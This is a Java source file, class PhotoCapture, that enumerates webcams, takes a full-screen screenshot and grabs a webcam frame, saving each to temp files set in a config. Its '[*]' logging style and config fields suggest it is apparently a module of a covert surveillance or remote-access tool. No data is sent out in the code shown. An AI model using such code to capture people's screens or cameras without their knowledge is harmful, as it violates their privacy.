import java.awt.Robot;
import java.io.File;
import javax.imageio.ImageIO;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import com.github.sarxos.webcam.Webcam;
import java.util.List;


public class PhotoCapture {
	public static List<Webcam> findWebcams() {
		return Webcam.getWebcams();
	}

	public static void takeScreenShot(Config conf) {
		System.out.println("[*] Taking screenshot");
		try {
			Robot r = new Robot();
			BufferedImage screenshot = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(screenshot, "PNG", new File(conf.tempscreen));
		} catch (Exception e) {
			System.out.println("[-] Screenshot error");
		}
	}

	public static void takeCameraShot(Config conf, Webcam w) {
		System.out.println("[*] Taking camera shot");
		try {
			w.open();
			BufferedImage camerashot = w.getImage();
			ImageIO.write(camerashot, "PNG", new File(conf.tempcamera));
			w.close();
		} catch (Exception e) {
			System.out.println("[-] Camera shot error");
		}
	}
}